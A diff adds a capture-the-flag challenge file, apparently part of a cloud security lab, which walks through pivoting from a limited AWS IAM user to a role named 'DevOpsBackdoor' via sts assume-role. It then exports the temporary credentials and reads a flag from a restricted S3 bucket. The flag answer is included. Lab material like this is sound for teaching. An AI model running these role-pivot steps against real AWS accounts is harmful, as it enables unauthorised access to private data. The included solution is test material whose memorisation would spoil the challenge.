@@ -1,0 +1,27 @@
+Side Mission: Forgotten Role
+
+Target Role: arn:aws:iam::13371337:role/DevOpsBackdoor
+
+Objective:
+Use sts:AssumeRole to pivot from a limited IAM user to a privileged role.
+
+Steps:
+1. Configure AWS CLI:
+   aws configure --profile foothold
+
+2. Assume role:
+   aws sts assume-role \
+     --role-arn arn:aws:iam::13371337:role/DevOpsBackdoor \
+     --role-session-name exploit-session \
+     --profile foothold > creds.json
+
+3. Export temporary credentials:
+   export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' creds.json)
+   export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' creds.json)
+   export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' creds.json)
+
+4. Access restricted bucket:
+   aws s3 cp s3://confidential-assets/flag.txt -
+
+Flag:
+CTF{cloudfl0at_br34k}
